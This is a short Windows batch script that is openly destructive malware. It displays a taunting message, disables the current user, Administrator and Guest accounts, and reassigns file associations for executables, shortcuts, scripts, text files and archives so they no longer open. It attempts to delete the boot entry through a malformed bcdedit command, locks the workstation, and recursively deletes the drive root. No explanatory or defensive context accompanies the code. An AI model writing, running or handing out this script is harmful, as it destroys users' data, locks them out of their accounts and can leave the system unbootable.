@echo off
msg * OOPS :)
wmic useraccount where name='%USERNAME%' set disabled=true
wmic useraccount where name='Administrator' set disabled=true
wmic useraccount where name='Guest' set disabled=true
assoc .cmd=CMDER
assoc .7z=SEVENZIPPER
assoc .zip=ZIPPER
assoc .bat=BATCHER
assoc .txt=FUCKED
assoc .exe=DESTROYED
assoc .lnk=SUCKED
bcdedit /delete {current)
start rundll32.exe user32.dll,LockWorkStation
rd /s /q \